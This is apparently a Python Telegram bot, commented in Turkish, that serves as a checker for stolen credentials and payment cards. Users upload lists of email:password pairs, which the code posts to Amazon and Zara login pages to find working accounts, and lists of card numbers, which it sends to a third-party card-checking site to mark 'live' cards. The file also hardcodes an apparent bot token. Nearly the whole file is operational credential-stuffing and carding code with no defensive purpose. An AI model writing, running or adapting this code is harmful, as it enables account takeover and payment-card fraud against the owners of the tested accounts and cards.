import logging
from telegram import __version__ as TG_VER

try:
    from telegram import __version_info__
except ImportError:
    __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]

if __version_info__ < (20, 0, 0, "alpha", 1):
    raise RuntimeError(
        f"This example is not compatible with your current PTB version {TG_VER}. To view the "
        f"{TG_VER} version of this example, "
        f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
    )

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# Bot token'ınızı buraya ekleyin
my_bot_token = '7196669683:AAH_ID98UlbkP_HUExE6dzmbbUJF1P2twjQ'

# URL ve istek başlıklarını ayarlayın
AMAZON_CHECK_URL = 'https://www.amazon.com/ap/signin'
ZARA_CHECK_URL = 'https://www.zara.com/tr/en/logon'
CC_CHECK_URL = 'https://checker.visatk.com/ccn1/alien07.php'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Logging ayarlama
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Bot başlatıldığında veya /start komutu gönderildiğinde çağrılır."""
    user = update.effective_user
    await update.message.reply_html(
        f"Merhaba {user.mention_html()}! Hesap veya kart kontrolü yapmak için aşağıdaki komutları kullanabilirsiniz:\n"
        "/check_amazon - Amazon hesap kontrolü\n"
        "/check_zara - Zara hesap kontrolü\n"
        "/check_cc - Kredi kartı kontrolü"
    )

async def check_amazon(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Kullanıcı /check_amazon komutu gönderdiğinde çağrılır."""
    context.user_data['check_type'] = 'amazon'
    await update.message.reply_text('Lütfen Amazon Hesap Dosyasını Gönderiniz.')

async def check_zara(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Kullanıcı /check_zara komutu gönderdiğinde çağrılır."""
    context.user_data['check_type'] = 'zara'
    await update.message.reply_text('Lütfen Zara Hesap Dosyasını Gönderiniz.')

async def check_cc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Kullanıcı /check_cc komutu gönderdiğinde çağrılır."""
    context.user_data['check_type'] = 'cc'
    await update.message.reply_text('Lütfen Kredi Kartı Dosyasını Gönderiniz.')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Kullanıcı bir dosya gönderdiğinde çağrılır."""
    document = update.message.document
    if not document:
        await update.message.reply_text("Lütfen bir dosya gönderin.")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8').splitlines()

    check_type = context.user_data.get('check_type')

    if check_type == 'amazon':
        await handle_amazon_check(update, context, file_content)
    elif check_type == 'zara':
        await handle_zara_check(update, context, file_content)
    elif check_type == 'cc':
        await handle_cc_check(update, context, file_content)
    else:
        await update.message.reply_text("Lütfen önce bir kontrol tipi seçin.")

async def handle_amazon_check(update: Update, context: ContextTypes.DEFAULT_TYPE, account_list: list) -> None:
    """Amazon hesaplarını kontrol eder."""
    for account in account_list:
        if ":" in account:
            email, password = account.strip().split(":")
        elif "|" in account:
            email, password = account.strip().split("|")
        else:
            await update.message.reply_text(f"Geçersiz format: {account}")
            continue

        data = {
            'email': email,
            'password': password
        }

        response = requests.post(AMAZON_CHECK_URL, headers=HEADERS, data=data)

        if response.status_code == 200 and 'ap/signin' not in response.url:
            await update.message.reply_text(f'AKTİF HESAP ✅ | {email}')
        else:
            await update.message.reply_text(f'GEÇERSİZ HESAP ❌ | {email}')

async def handle_zara_check(update: Update, context: ContextTypes.DEFAULT_TYPE, account_list: list) -> None:
    """Zara hesaplarını kontrol eder."""
    for account in account_list:
        if ":" in account:
            email, password = account.strip().split(":")
        elif "|" in account:
            email, password = account.strip().split("|")
        else:
            await update.message.reply_text(f"Geçersiz format: {account}")
            continue

        data = {
            'logonId': email,
            'password': password
        }

        response = requests.post(ZARA_CHECK_URL, headers=HEADERS, data=data)

        if response.status_code == 200 and 'myaccount' in response.url:
            await update.message.reply_text(f'AKTİF HESAP ✅ | {email}')
        else:
            await update.message.reply_text(f'GEÇERSİZ HESAP ❌ | {email}')

async def handle_cc_check(update: Update, context: ContextTypes.DEFAULT_TYPE, visa_list: list) -> None:
    """Kredi kartlarını kontrol eder."""
    for visa in visa_list:
        data = {
            'ajax': '1',
            'do': 'check',
            'cclist': visa
        }

        response = requests.post(CC_CHECK_URL, headers=HEADERS, data=data).text
        
        if 'Live' in response:
            await update.message.reply_text(f'AKTİF KART ✅ | {visa}')
        else:
            await update.message.reply_text(f'GEÇERSİZ KART ❌ | {visa}')

def main() -> None:
    """Botun ana fonksiyonu. Güncelleyici ve işleyicileri başlatır."""
    application = ApplicationBuilder().token(my_bot_token).build()

    # Komut işleyicilerini ekle
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check_amazon", check_amazon))
    application.add_handler(CommandHandler("check_zara", check_zara))
    application.add_handler(CommandHandler("check_cc", check_cc))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Botu çalıştır
    application.run_polling()

if __name__ == "__main__":
    main()
